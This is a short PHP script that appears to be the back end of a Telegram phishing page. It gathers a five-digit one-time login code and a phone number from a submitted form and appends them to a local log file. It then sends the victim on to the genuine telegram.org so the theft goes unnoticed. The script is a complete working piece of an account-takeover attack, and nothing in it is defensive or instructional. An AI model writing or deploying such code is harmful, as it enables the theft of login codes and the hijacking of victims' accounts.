<?php
// Capture OTP
$otp = $_POST['otp1'] . $_POST['otp2'] . $_POST['otp3'] . $_POST['otp4'] . $_POST['otp5'];
$phone = $_POST['phone'];
file_put_contents('logs.txt', "OTP: $otp (Phone: $phone)\n", FILE_APPEND);

// Redirect to real Telegram
header("Location: https://telegram.org");
exit();
?>
